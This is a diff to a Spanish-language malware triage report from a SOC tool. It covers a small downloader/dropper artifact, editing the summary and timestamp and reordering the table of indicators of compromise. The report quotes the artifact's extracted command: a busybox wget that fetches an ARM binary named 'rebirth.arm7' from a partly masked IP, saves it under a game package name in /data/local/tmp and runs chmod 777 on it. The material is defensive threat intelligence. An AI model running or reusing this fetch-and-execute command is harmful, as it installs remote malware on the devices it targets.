@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Cambio de permisos. Se asoció 1 comando observado o extraído.
+Artefacto de 208 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `rebirth.arm7` en `hxxp://94.154.43.XXX/rebirth.arm7`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -14,7 +15,7 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:50:21+00:00`
+- **Registrado:** `2026-08-09T19:50:21.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -52,10 +53,10 @@ shell:busybox wget hxxp://94.154.43.XXX/rebirth.arm7 -O /data/local/tmp/com.supe
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 94.154.43.XXX | static_analysis |
 | url | hxxp://94.154.43.XXX/rebirth.arm7 | strings |
-| hash | c7a6b5dbbaac4d56d1541040ee58fbe806cead4c38d9f4bfa6eeab8a5f2274bf | static_analysis |
+| ip | 94.154.43.XXX | static_analysis |
 | command | shell:busybox wget hxxp://94.154.43.XXX/rebirth.arm7 -O /data/local/tmp/com.supercell.clashroyal; chmod 777 /data/local/t | strings |
+| hash | c7a6b5dbbaac4d56d1541040ee58fbe806cead4c38d9f4bfa6eeab8a5f2274bf | static_analysis |
 | ip | 46.151.178.XXX | artifact_source |
 
 ## 🔎 Triage
